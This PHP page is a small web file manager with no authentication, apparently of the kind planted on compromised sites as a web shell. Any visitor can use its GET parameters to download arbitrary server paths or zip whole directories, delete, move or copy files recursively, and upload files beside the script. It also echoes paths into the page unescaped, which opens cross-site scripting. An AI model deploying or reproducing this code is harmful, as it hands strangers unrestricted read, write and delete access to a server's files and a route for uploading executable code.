<?php
function download($file) {
	if (!file_exists($file)) return false;
	if (is_dir($file)) return false;
	$name = basename($file);
	header("Pragma: public");
	header("Cache-Control: maxage=1, post-check=0, pre-check=0");
    header("Content-Type: application/force-download");
    header("Content-type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"".$name."\";");
	header("X-Content-Type-Options: nosniff");
	header("Content-Length: " . filesize($file));
	header("Expires: 0");
    readfile($file);
    return true;
}
function allDirInfo($dir = ''){
	$fileList = array();
	if (empty($dir)) $dir = dirname(__FILE__);
	if ((substr($dir, -1, 1) != '\\') && (substr($dir, -1, 1) != '/')) $dir .= DIRECTORY_SEPARATOR;
	if (file_exists($dir)) {
		if (is_dir($dir)) {
			if ($dh = opendir($dir)) {
				while (($file = readdir($dh)) !== false) {
					$realpath = realpath($dir . $file);
					$pInfo = pathinfo($realpath);
					$ext = (isset($pInfo['extension'])) ? $pInfo['extension'] : '';
					$fileList[] = array('name' => $file, 'type' => filetype($realpath), 'path' => $realpath, 'ext' => $ext);
				}
				closedir($dh);
			}
		} elseif (is_file($dir)) {
			$realpath = realpath($dir);
			$pInfo = pathinfo($realpath);
			$ext = (isset($pInfo['extension'])) ? $pInfo['extension'] : '';
			$fileList[] = array('name' => basename($dir), 'type' => filetype($realpath), 'path' => $realpath, 'ext' => $ext);
		}
	}
	return $fileList;
}
function getDirectories($dirInfo) {
	$dirList = array();
	if (!is_array($dirInfo)) return $dirList;
	foreach ($dirInfo as $value) {
		if($value['type'] == 'dir') $dirList[] = $value;
	}
	return $dirList;
}
function getFiles($dirInfo) {
	$fileList = array();
	if (!is_array($dirInfo)) return $fileList;
	foreach ($dirInfo as $value) {
		if($value['type'] == 'file') $fileList[] = $value;
	}
	return $fileList;
}
function displayFormat($size) {
	if ($size == 0) return '0 KB';
	if ($size <= 1024) return '1 KB';
	$v = $size / 1024;
	if (($v > 1) && ($v < 10)) return round($v, 1) . ' KB';
	$v = number_format(round($v));
	return $v . ' KB';
}
function allFileList($dir, $fileList = '') {
	if ((substr($dir, -1, 1) != '\\') && (substr($dir, -1, 1) != '/')) $dir .= DIRECTORY_SEPARATOR;
	if (is_dir($dir)) {
		if ($dh = opendir($dir)) {
			while (($file = readdir($dh)) !== false) {
				if(($file == '.') || ($file == '..')) continue;
				$realpath = realpath($dir . $file);
				if(filetype($realpath) == 'dir'){
					$fileList = allFileList($realpath, $fileList);
				} else {
					$fileList[] = $realpath;
				}
			}
			closedir($dh);
		}
	}
	return $fileList;
}
function dirToZip($dir) {
	if ((substr($dir, -1, 1) != '\\') && (substr($dir, -1, 1) != '/')) $dir .= DIRECTORY_SEPARATOR;
	$fileName = basename($dir) . '-' . time() . '.zip';
	$target = $dir . $fileName;
	$fileList = allFileList($dir);
	$zip = new ZipArchive;
	$res = $zip->open($target, ZIPARCHIVE::CREATE);
	if ($res === TRUE) {
		foreach ($fileList as $value) {
			$zip->addFile($value, substr($value, strlen($dir)));
		}
		$zip->close();
	} else {
		return false;
	}
	return $target;
}

// removes files and non-empty directories
function rrmdir($dir) {
  if (is_dir($dir)) {
    $files = scandir($dir);
    foreach ($files as $file)
    if ($file != "." && $file != "..") rrmdir("$dir/$file");
    rmdir($dir);
  }
  else if (file_exists($dir)) unlink($dir);
}

// copies files and non-empty directories
function rcopy($src, $dst) {
  if (file_exists($dst)) rrmdir($dst);
  if (is_dir($src)) {
    mkdir($dst);
    $files = scandir($src);
    foreach ($files as $file)
    if ($file != "." && $file != "..") rcopy("$src/$file", "$dst/$file");
  }
  else if (file_exists($src)) copy($src, $dst);
}


if (isset($_GET['dw'])) {
	$dw = download($_GET['dw']);
	if($dw) exit();
} elseif (isset($_GET['zp'])) {
	$zip = dirToZip($_GET['zp']);
	if($zip){
		$dw = download($zip);
		@unlink($zip);
		if($dw) exit();
	}
} elseif (isset($_GET['fp'])) {
	$dir = $_GET['fp'];

} elseif (isset($_GET['rm'])) {
	$dir = dirname($_GET['rm']);
	if ($_GET['rm'] != __FILE__) {
		rrmdir($_GET['rm']);
	}

} elseif (isset($_GET['mv']) && !empty($_GET['to'])) {
	if (file_exists($_GET['mv'])) {
		if ($_GET['mv'] != __FILE__) {
			$dir = dirname($_GET['to']);
			rename($_GET['mv'], $_GET['to']);
		}
	}

} elseif (isset($_GET['cp']) && !empty($_GET['to'])) {
	if (file_exists($_GET['cp']) && file_exists(dirname($_GET['to']))) {
		$dir = dirname($_GET['to']);
		rcopy($_GET['cp'], $_GET['to']);
	}

} else {
	$dir = dirname(__FILE__);
}
if (empty($dir)) $dir = dirname(__FILE__);
if (!empty($_FILES)) {
	move_uploaded_file($_FILES['fup']['tmp_name'], dirname(__FILE__) . DIRECTORY_SEPARATOR . $_FILES['fup']['name']);
}
?>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title> </title>
<style type="text/css">
	* {font-family: Segoe UI,Arial,sans-serif; font-size: 13px;}
	a {color: #008000; text-decoration: none;}
	a:hover {text-decoration: underline;}
	input {width: 100%; border: 1px solid #aaaaaa;}
	form {padding: 0; margin: 0;}
</style>
<script type="text/javascript">
	var url = '<?php echo $_SERVER['SCRIPT_NAME']; ?>';
	function isMove(mv){
		var target = prompt('Enter the target directory.');
		if(target != null) location.href = url + '?mv=' + mv + '&to=' + encodeURIComponent(target);
	}
	function isCopy(cp){
		var target = prompt('Enter the target directory.');
		if(target != null) location.href = url + '?cp=' + cp + '&to=' + encodeURIComponent(target);
	}
</script>
</head>
<body>
<table border="1" style="border-collapse: collapse;" bordercolor="#eeeeee">
	<tr>
		<td style="padding: 0" colspan="2">
		<form><input type="text" value="<?php echo $dir;?>" name="fp"></form>
		</td>
		<form method="post" enctype="multipart/form-data" action="<?php echo $_SERVER['SCRIPT_NAME']; ?>">
		<td colspan="3">
			<input type="file" name="fup">
		</td>
		<td align="center">
			<button type="submit">OK</button>
		</td>
		</form>
	</tr>
	<tr bgcolor="#cccccc">
		<td style="padding: 2px 10px" width="200">Name</td>
		<td style="padding: 2px 10px" width="70">Type</td>
		<td style="padding: 2px 10px" width="60" align="right">Size</td>
		<td style="padding: 2px 10px" align="center" colspan="3">Action</td>
	</tr>
	<?php
	$list = allDirInfo($dir);
	sort($list);
	foreach (getDirectories($list) as $value) {
		if ($value['name'] == '.') continue;
		if ($value['name'] == '..') {
			$value['name'] = '<b>- UP -</b>';
			$value['type'] = '';
		} else {
			$value['type'] = 'File Folder';
		}
		echo '<tr>';
		echo '<td style="padding: 2px 10px" nowrap>';
		echo '<a href="'.$_SERVER['SCRIPT_NAME'].'?fp='.urlencode($value['path']).'"><b>' . $value['name'] . '</b></a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" nowrap>' . $value['type'] . '</td>';
		echo '<td align=right style="padding: 2px 10px" nowrap>';
		if($value['type'] != '') echo '<a href="#" onclick="if(confirm(\'download?\')){window.open(\''.$_SERVER['SCRIPT_NAME'].'?zp='.urlencode($value['path']).'\', \'_self\');}">download</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="javascript:void(0)" onclick="if(confirm(\'Remove?\')){window.open(\''.$_SERVER['SCRIPT_NAME'].'?rm='.urlencode($value['path']).'\', \'_self\');}">Remove</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" onclick="isMove(\'' . urlencode($value['path']) . '\')">Move</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" onclick="isCopy(\'' . urlencode($value['path']) . '\')">Copy</a>';
		echo '</td>';
		echo '</tr>';
		echo '</tr>';
	}
	$sum = 0;
	foreach (getFiles($list) as $value) {
		echo '<tr>';
		echo '<td style="padding: 2px 10px" nowrap>';
		echo '<a href="'.$_SERVER['SCRIPT_NAME'].'?dw='.urlencode($value['path']).'">' . $value['name'] . '</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" nowrap>' . strtoupper($value['ext']) . ' File' . '</td>';
		echo '<td style="padding: 2px 10px" align=right nowrap>' . displayFormat(filesize($value['path'])) . '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		echo '<a href="javascript:void(0)" onclick="if(confirm(\'Remove?\')){window.open(\''.$_SERVER['SCRIPT_NAME'].'?rm='.urlencode($value['path']).'\', \'_self\');}">Remove</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" onclick="isMove(\'' . urlencode($value['path']) . '\')">Move</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" onclick="isCopy(\'' . urlencode($value['path']) . '\')">Copy</a>';
		echo '</td>';
		echo '</tr>';
		$sum += filesize($value['path']);
	}
	if($sum > 0){
		echo '<tr>';
		echo '<td colspan=2></td>';
		echo '<td style="padding: 2px 10px" align=right nowrap><b>' . displayFormat($sum) . '</b></td>';
		echo '</tr>';
	}
	?>
	<tr>

	</tr>
</table>
</body>
</html>